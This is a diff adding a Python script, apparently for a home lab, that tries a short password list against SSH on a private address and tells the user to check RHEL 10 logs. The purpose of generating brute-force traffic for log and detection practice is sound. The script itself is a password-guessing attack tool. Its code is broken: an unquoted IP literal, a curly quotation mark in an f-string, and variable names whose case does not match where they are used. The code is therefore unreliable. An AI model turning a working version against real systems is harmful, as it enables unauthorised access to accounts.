@@ -1,0 +1,42 @@
+import paramiko
+import time
+
+target_ip = 192.168.56.101
+target_port = 22
+username= "project1"                  
+
+PASSWORDS = [
+    "password123",
+    "admin2026!",
+    "letmein",
+    "redhat123",
+    "incorrect_pass_1",
+    "incorrect_pass_2",
+    "incorrect_pass_3",
+    "incorrect_pass_4"
+]
+
+def simulate_ssh_brute():
+    print(f"Starting simulated SSH brute-force against {TARGET_IP}...")
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    for i, password in enumerate(PASSWORDS):
+        print(f”Attempt {i+1}: Trying password '{password}'...")
+        try:
+            # Attempt connection with a short timeout
+            ssh.connect(TARGET_IP, port=TARGET_PORT, username=USERNAME, password=password, timeout=3)
+            print(f"SUCCESS? Connected with password: {password}")
+            ssh.close()
+            break
+        except paramiko.AuthenticationException:
+            print(f"[!] Authentication failed for password: {password}")
+        except Exception as e:
+            print(f"Connection error: {e}")
+       
+        time.sleep(1)
+
+    print("Simulation complete. Check your RHEL 10 logs!")
+
+if __name__ == "__main__":
+    simulate_ssh_brute()
